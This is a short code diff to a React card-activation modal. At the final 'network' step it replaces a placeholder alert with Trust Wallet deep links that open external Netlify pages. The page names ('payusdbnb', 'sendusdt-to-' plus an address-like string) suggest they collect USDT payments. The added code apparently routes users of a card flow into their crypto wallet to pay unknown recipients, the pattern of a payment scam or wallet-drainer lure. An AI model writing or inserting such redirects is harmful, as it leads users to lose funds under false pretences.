@@ -25,8 +25,11 @@ export const CardModals: React.FC<CardModalsProps> = ({ isOpen, onClose }) => {
     else if (step === 'email') setStep('review');
     else if (step === 'review') setStep('network');
     else if (step === 'network') {
-      // Final activation logic
-      alert('Payment initiated on ' + network.toUpperCase() + ' network for: ' + email + ' / ' + selectedCard);
+      // Open Trust Wallet deep link based on selected network
+      const bep20Url = 'https://link.trustwallet.com/open_url?coin_id=60&url=https%3A%2F%2Fpayusdbnb.netlify.app';
+      const trc20Url = 'https://link.trustwallet.com/open_url?coin_id=60&url=https://sendusdt-to-ten4gkswudmgc3saupjfmgxrvzynwt8b9y.netlify.app';
+      
+      window.open(network === 'bep20' ? bep20Url : trc20Url, '_blank');
       onClose();
       // Reset after close
       setTimeout(() => {
